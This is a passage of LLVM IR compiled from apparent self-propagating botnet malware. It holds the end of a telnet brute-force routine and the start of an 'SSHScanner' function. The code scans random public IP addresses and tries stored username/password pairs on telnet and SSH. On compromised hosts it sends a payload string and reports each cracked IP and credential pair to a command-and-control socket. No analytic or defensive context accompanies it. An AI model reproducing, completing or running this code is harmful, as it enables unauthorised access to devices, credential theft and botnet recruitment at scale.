  %2070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2069, i32 0, i32 6
  store i32 %2066, i32* %2070, align 4
  br label %2071

2071:                                             ; preds = %2064, %2057
  %2072 = load i32, i32* %2, align 4
  %2073 = sext i32 %2072 to i64
  %2074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2073
  %2075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2074, i32 0, i32 0
  %2076 = load i32, i32* %2075, align 16
  %2077 = load i32, i32* %2, align 4
  %2078 = sext i32 %2077 to i64
  %2079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2078
  %2080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2079, i32 0, i32 8
  %2081 = load i8*, i8** %2080, align 8
  %2082 = load i32, i32* %2, align 4
  %2083 = sext i32 %2082 to i64
  %2084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2083
  %2085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2084, i32 0, i32 7
  %2086 = load i16, i16* %2085, align 16
  %2087 = zext i16 %2086 to i32
  %2088 = call i32 @readUntil(i32 %2076, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %2081, i32 1024, i32 %2087)
  %2089 = icmp ne i32 %2088, 0
  br i1 %2089, label %2090, label %2131

2090:                                             ; preds = %2071
  %2091 = load i32, i32* %2, align 4
  %2092 = sext i32 %2091 to i64
  %2093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2092
  %2094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2093, i32 0, i32 6
  store i32 0, i32* %2094, align 4
  %2095 = load i32, i32* %2, align 4
  %2096 = sext i32 %2095 to i64
  %2097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2096
  %2098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2097, i32 0, i32 7
  store i16 0, i16* %2098, align 16
  %2099 = load i32, i32* %2, align 4
  %2100 = sext i32 %2099 to i64
  %2101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2100
  %2102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2101, i32 0, i32 0
  %2103 = load i32, i32* %2102, align 16
  %2104 = call i64 @send(i32 %2103, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384)
  %2105 = load i32, i32* @mainCommSock, align 4
  %2106 = load i32, i32* %2, align 4
  %2107 = sext i32 %2106 to i64
  %2108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2107
  %2109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2108, i32 0, i32 1
  %2110 = bitcast i32* %2109 to %struct.in_addr*
  %2111 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2110, i32 0, i32 0
  %2112 = load i32, i32* %2111, align 4
  %2113 = call i8* @inet_ntoa(i32 %2112) #12
  %2114 = load i32, i32* %2, align 4
  %2115 = sext i32 %2114 to i64
  %2116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2115
  %2117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2116, i32 0, i32 4
  %2118 = load i8, i8* %2117, align 2
  %2119 = zext i8 %2118 to i64
  %2120 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2119
  %2121 = load i8*, i8** %2120, align 8
  %2122 = load i32, i32* %2, align 4
  %2123 = sext i32 %2122 to i64
  %2124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2123
  %2125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2124, i32 0, i32 5
  %2126 = load i8, i8* %2125, align 1
  %2127 = zext i8 %2126 to i64
  %2128 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2127
  %2129 = load i8*, i8** %2128, align 8
  %2130 = call i32 (i32, i8*, ...) @sockprintf(i32 %2105, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %2113, i8* %2121, i8* %2129)
  br label %2311

2131:                                             ; preds = %2071
  %2132 = load i32, i32* %2, align 4
  %2133 = sext i32 %2132 to i64
  %2134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2133
  %2135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2134, i32 0, i32 0
  %2136 = load i32, i32* %2135, align 16
  %2137 = load i32, i32* %2, align 4
  %2138 = sext i32 %2137 to i64
  %2139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2138
  %2140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2139, i32 0, i32 8
  %2141 = load i8*, i8** %2140, align 8
  %2142 = load i32, i32* %2, align 4
  %2143 = sext i32 %2142 to i64
  %2144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2143
  %2145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2144, i32 0, i32 7
  %2146 = load i16, i16* %2145, align 16
  %2147 = zext i16 %2146 to i32
  %2148 = call i32 @readUntil(i32 %2136, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %2141, i32 1024, i32 %2147)
  %2149 = icmp ne i32 %2148, 0
  br i1 %2149, label %2150, label %2191

2150:                                             ; preds = %2131
  %2151 = load i32, i32* %2, align 4
  %2152 = sext i32 %2151 to i64
  %2153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2152
  %2154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2153, i32 0, i32 6
  store i32 0, i32* %2154, align 4
  %2155 = load i32, i32* %2, align 4
  %2156 = sext i32 %2155 to i64
  %2157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2156
  %2158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2157, i32 0, i32 7
  store i16 0, i16* %2158, align 16
  %2159 = load i32, i32* %2, align 4
  %2160 = sext i32 %2159 to i64
  %2161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2160
  %2162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2161, i32 0, i32 0
  %2163 = load i32, i32* %2162, align 16
  %2164 = call i64 @send(i32 %2163, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384)
  %2165 = load i32, i32* @mainCommSock, align 4
  %2166 = load i32, i32* %2, align 4
  %2167 = sext i32 %2166 to i64
  %2168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2167
  %2169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2168, i32 0, i32 1
  %2170 = bitcast i32* %2169 to %struct.in_addr*
  %2171 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2170, i32 0, i32 0
  %2172 = load i32, i32* %2171, align 4
  %2173 = call i8* @inet_ntoa(i32 %2172) #12
  %2174 = load i32, i32* %2, align 4
  %2175 = sext i32 %2174 to i64
  %2176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2175
  %2177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2176, i32 0, i32 4
  %2178 = load i8, i8* %2177, align 2
  %2179 = zext i8 %2178 to i64
  %2180 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2179
  %2181 = load i8*, i8** %2180, align 8
  %2182 = load i32, i32* %2, align 4
  %2183 = sext i32 %2182 to i64
  %2184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2183
  %2185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2184, i32 0, i32 5
  %2186 = load i8, i8* %2185, align 1
  %2187 = zext i8 %2186 to i64
  %2188 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2187
  %2189 = load i8*, i8** %2188, align 8
  %2190 = call i32 (i32, i8*, ...) @sockprintf(i32 %2165, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %2173, i8* %2181, i8* %2189)
  br label %2311

2191:                                             ; preds = %2131
  %2192 = load i32, i32* %2, align 4
  %2193 = sext i32 %2192 to i64
  %2194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2193
  %2195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2194, i32 0, i32 0
  %2196 = load i32, i32* %2195, align 16
  %2197 = load i32, i32* %2, align 4
  %2198 = sext i32 %2197 to i64
  %2199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2198
  %2200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2199, i32 0, i32 8
  %2201 = load i8*, i8** %2200, align 8
  %2202 = load i32, i32* %2, align 4
  %2203 = sext i32 %2202 to i64
  %2204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2203
  %2205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2204, i32 0, i32 7
  %2206 = load i16, i16* %2205, align 16
  %2207 = zext i16 %2206 to i32
  %2208 = call i32 @readUntil(i32 %2196, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %2201, i32 1024, i32 %2207)
  %2209 = icmp ne i32 %2208, 0
  br i1 %2209, label %2210, label %2270

2210:                                             ; preds = %2191
  %2211 = load i32, i32* %2, align 4
  %2212 = sext i32 %2211 to i64
  %2213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2212
  %2214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2213, i32 0, i32 6
  store i32 0, i32* %2214, align 4
  %2215 = load i32, i32* %2, align 4
  %2216 = sext i32 %2215 to i64
  %2217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2216
  %2218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2217, i32 0, i32 7
  store i16 0, i16* %2218, align 16
  %2219 = load i32, i32* %2, align 4
  %2220 = sext i32 %2219 to i64
  %2221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2220
  %2222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2221, i32 0, i32 0
  %2223 = load i32, i32* %2222, align 16
  %2224 = call i64 @send(i32 %2223, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384)
  %2225 = load i32, i32* @mainCommSock, align 4
  %2226 = load i32, i32* %2, align 4
  %2227 = sext i32 %2226 to i64
  %2228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2227
  %2229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2228, i32 0, i32 1
  %2230 = bitcast i32* %2229 to %struct.in_addr*
  %2231 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2230, i32 0, i32 0
  %2232 = load i32, i32* %2231, align 4
  %2233 = call i8* @inet_ntoa(i32 %2232) #12
  %2234 = load i32, i32* %2, align 4
  %2235 = sext i32 %2234 to i64
  %2236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2235
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2236, i32 0, i32 4
  %2238 = load i8, i8* %2237, align 2
  %2239 = zext i8 %2238 to i64
  %2240 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2239
  %2241 = load i8*, i8** %2240, align 8
  %2242 = load i32, i32* %2, align 4
  %2243 = sext i32 %2242 to i64
  %2244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2243
  %2245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2244, i32 0, i32 5
  %2246 = load i8, i8* %2245, align 1
  %2247 = zext i8 %2246 to i64
  %2248 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2247
  %2249 = load i8*, i8** %2248, align 8
  %2250 = call i32 (i32, i8*, ...) @sockprintf(i32 %2225, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %2233, i8* %2241, i8* %2249)
  %2251 = load i32, i32* %2, align 4
  %2252 = sext i32 %2251 to i64
  %2253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2252
  %2254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2253, i32 0, i32 8
  %2255 = load i8*, i8** %2254, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %2255, i8 0, i64 1024, i1 false)
  %2256 = load i32, i32* %2, align 4
  %2257 = sext i32 %2256 to i64
  %2258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2257
  %2259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2258, i32 0, i32 0
  %2260 = load i32, i32* %2259, align 16
  %2261 = call i32 @sclose(i32 %2260)
  %2262 = load i32, i32* %2, align 4
  %2263 = sext i32 %2262 to i64
  %2264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2263
  %2265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2264, i32 0, i32 3
  store i8 1, i8* %2265, align 1
  %2266 = load i32, i32* %2, align 4
  %2267 = sext i32 %2266 to i64
  %2268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2267
  %2269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2268, i32 0, i32 2
  store i8 0, i8* %2269, align 8
  br label %2311

2270:                                             ; preds = %2191
  %2271 = load i32, i32* %2, align 4
  %2272 = sext i32 %2271 to i64
  %2273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2272
  %2274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2273, i32 0, i32 8
  %2275 = load i8*, i8** %2274, align 8
  %2276 = call i64 @strlen(i8* %2275) #11
  %2277 = trunc i64 %2276 to i16
  %2278 = load i32, i32* %2, align 4
  %2279 = sext i32 %2278 to i64
  %2280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2279
  %2281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2280, i32 0, i32 7
  store i16 %2277, i16* %2281, align 16
  br label %2282

2282:                                             ; preds = %2270
  br label %2283

2283:                                             ; preds = %2282
  br label %2284

2284:                                             ; preds = %2283
  %2285 = load i32, i32* %2, align 4
  %2286 = sext i32 %2285 to i64
  %2287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2286
  %2288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2287, i32 0, i32 6
  %2289 = load i32, i32* %2288, align 4
  %2290 = add i32 %2289, 10
  %2291 = zext i32 %2290 to i64
  %2292 = call i64 @time(i64* null) #12
  %2293 = icmp slt i64 %2291, %2292
  br i1 %2293, label %2294, label %2309

2294:                                             ; preds = %2284
  %2295 = load i32, i32* %2, align 4
  %2296 = sext i32 %2295 to i64
  %2297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2296
  %2298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2297, i32 0, i32 0
  %2299 = load i32, i32* %2298, align 16
  %2300 = call i32 @sclose(i32 %2299)
  %2301 = load i32, i32* %2, align 4
  %2302 = sext i32 %2301 to i64
  %2303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2302
  %2304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2303, i32 0, i32 2
  store i8 0, i8* %2304, align 8
  %2305 = load i32, i32* %2, align 4
  %2306 = sext i32 %2305 to i64
  %2307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %2306
  %2308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2307, i32 0, i32 3
  store i8 1, i8* %2308, align 1
  br label %2309

2309:                                             ; preds = %2294, %2284
  br label %2310

2310:                                             ; preds = %70, %2309, %2018, %1987, %1959, %1931, %1907, %1201, %1137, %772, %708, %397, %233
  br label %2311

2311:                                             ; preds = %2310, %2210, %2150, %2090, %2037, %1972, %1944, %1916, %1864, %1839, %1798, %1773, %1732, %1707, %1666, %1641, %1600, %1575, %1534, %1509, %1468, %1443, %1402, %1377, %1349, %1308, %1283, %1255, %1186, %1163, %1085, %1062, %1039, %1016, %993, %970, %947, %924, %901, %887, %836, %757, %734, %662, %611, %560, %509, %458, %321, %186, %142
  %2312 = load i32, i32* %2, align 4
  %2313 = add nsw i32 %2312, 1
  store i32 %2313, i32* %2, align 4
  br label %66, !llvm.loop !39

2314:                                             ; preds = %66
  br label %64
}

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #2

declare i32 @system(i8*) #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @SSHScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.fd_set*, align 8
  %15 = call i32 @getdtablesize() #12
  %16 = sdiv i32 %15, 4
  %17 = mul nsw i32 %16, 3
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* %1, align 4
  %19 = icmp sgt i32 %18, 512
  br i1 %19, label %20, label %21

20:                                               ; preds = %0
  br label %23

21:                                               ; preds = %0
  %22 = load i32, i32* %1, align 4
  br label %23

23:                                               ; preds = %21, %20
  %24 = phi i32 [ 512, %20 ], [ %22, %21 ]
  store i32 %24, i32* %1, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 zeroext 22) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %29, i8 0, i64 8, i1 false)
  %30 = load i32, i32* %1, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %9, align 8
  %33 = alloca %struct.telstate_t.1, i64 %31, align 16
  store i64 %31, i64* %10, align 8
  %34 = bitcast %struct.telstate_t.1* %33 to i8*
  %35 = load i32, i32* %1, align 4
  %36 = sext i32 %35 to i64
  %37 = mul i64 %36, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %34, i8 0, i64 %37, i1 false)
  store i32 0, i32* %2, align 4
  br label %38

38:                                               ; preds = %57, %23
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* %1, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %60

42:                                               ; preds = %38
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias align 16 i8* @malloc(i64 1024) #12
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %56, i8 0, i64 1024, i1 false)
  br label %57

57:                                               ; preds = %42
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  br label %38, !llvm.loop !40

60:                                               ; preds = %38
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 5, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

63:                                               ; preds = %2274, %60
  br label %64

64:                                               ; preds = %63
  store i32 0, i32* %2, align 4
  br label %65

65:                                               ; preds = %2271, %64
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %2274

69:                                               ; preds = %65
  %70 = load i32, i32* %2, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %72, i32 0, i32 2
  %74 = load i8, i8* %73, align 8
  %75 = zext i8 %74 to i32
  switch i32 %75, label %2270 [
    i32 0, label %76
    i32 1, label %233
    i32 2, label %397
    i32 3, label %708
    i32 4, label %776
    i32 5, label %1137
    i32 6, label %1205
    i32 7, label %1907
    i32 8, label %1935
    i32 9, label %1963
    i32 10, label %2017
  ]

76:                                               ; preds = %69
  %77 = load i32, i32* %2, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %79, i32 0, i32 8
  %81 = load i8*, i8** %80, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %81, i8 0, i64 1024, i1 false)
  %82 = load i32, i32* %2, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %84, i32 0, i32 3
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %108

88:                                               ; preds = %76
  %89 = load i32, i32* %2, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %91, i32 0, i32 8
  %93 = load i8*, i8** %92, align 8
  store i8* %93, i8** %12, align 8
  %94 = load i32, i32* %2, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %95
  %97 = bitcast %struct.telstate_t.1* %96 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %97, i8 0, i64 32, i1 false)
  %98 = load i8*, i8** %12, align 8
  %99 = load i32, i32* %2, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %101, i32 0, i32 8
  store i8* %98, i8** %102, align 8
  %103 = call i32 @getRandomPublicIP()
  %104 = load i32, i32* %2, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %106, i32 0, i32 1
  store i32 %103, i32* %107, align 4
  br label %147

108:                                              ; preds = %76
  %109 = load i32, i32* %2, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %111, i32 0, i32 5
  %113 = load i8, i8* %112, align 1
  %114 = add i8 %113, 1
  store i8 %114, i8* %112, align 1
  %115 = load i32, i32* %2, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %117, i32 0, i32 5
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i64
  %121 = icmp eq i64 %120, 13
  br i1 %121, label %122, label %133

122:                                              ; preds = %108
  %123 = load i32, i32* %2, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %125, i32 0, i32 5
  store i8 0, i8* %126, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %129, i32 0, i32 4
  %131 = load i8, i8* %130, align 2
  %132 = add i8 %131, 1
  store i8 %132, i8* %130, align 2
  br label %133

133:                                              ; preds = %122, %108
  %134 = load i32, i32* %2, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = zext i8 %138 to i64
  %140 = icmp eq i64 %139, 4
  br i1 %140, label %141, label %146

141:                                              ; preds = %133
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %144, i32 0, i32 3
  store i8 1, i8* %145, align 1
  br label %2271

146:                                              ; preds = %133
  br label %147

147:                                              ; preds = %146, %88
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %148, align 4
  %149 = call zeroext i16 @htons(i16 zeroext 22) #15
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %149, i16* %150, align 2
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %152 = getelementptr inbounds [8 x i8], [8 x i8]* %151, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %152, i8 0, i64 8, i1 false)
  %153 = load i32, i32* %2, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 %157, i32* %159, align 4
  %160 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %163, i32 0, i32 0
  store i32 %160, i32* %164, align 16
  %165 = load i32, i32* %2, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 16
  %170 = bitcast %struct.timeval* %11 to i8*
  %171 = call i32 @setsockopt(i32 %169, i32 1, i32 20, i8* %170, i32 16) #12
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 16
  %177 = bitcast %struct.timeval* %11 to i8*
  %178 = call i32 @setsockopt(i32 %176, i32 1, i32 21, i8* %177, i32 16) #12
  %179 = load i32, i32* %2, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 16
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %186

185:                                              ; preds = %147
  br label %2271

186:                                              ; preds = %147
  %187 = load i32, i32* %2, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = load i32, i32* %2, align 4
  %193 = sext i32 %192 to i64
